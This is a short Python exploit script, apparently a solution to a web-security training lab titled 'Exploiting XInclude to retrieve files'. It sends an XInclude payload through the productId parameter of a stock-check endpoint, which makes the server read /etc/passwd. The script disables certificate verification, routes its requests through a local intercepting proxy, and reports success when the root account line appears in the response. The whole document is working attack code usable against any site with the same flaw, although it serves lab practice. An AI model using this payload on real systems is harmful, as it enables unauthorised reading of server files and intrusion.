import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

def extract_data(url):
    # PREPARE URL
    stock_url = url + '/product/stock'
    
    # STORE PAYLOAD AND PREPARE PARAMS
    xxe = '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>'

    params = {
        'productId' : xxe,
        'storeId' : 1
    }

    # SEND REQUEST AND EXTRACT DATA
    r = requests.post(stock_url, data=params, verify=False, proxies=proxies)
    if "root:x:0:0:root:/root:/bin/bash" not in r.text:
        print("[-] Exploit failed!")
        sys.exit(-1)
    print("[+] Exploit worked!")
    print(r.text)

def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1].strip()
    print("[+] Lab: Exploiting XInclude to retrieve files")
    print("""[+] This lab has a "Check stock" feature that embeds the user input inside a server-side XML document that is subsequently parsed.
    Because you don't control the entire XML document you can't define a DTD to launch a classic XXE attack.
To solve the lab, inject an XInclude statement to retrieve the contents of the /etc/passwd file.""")

    extract_data(url)

if __name__ == "__main__":
    main()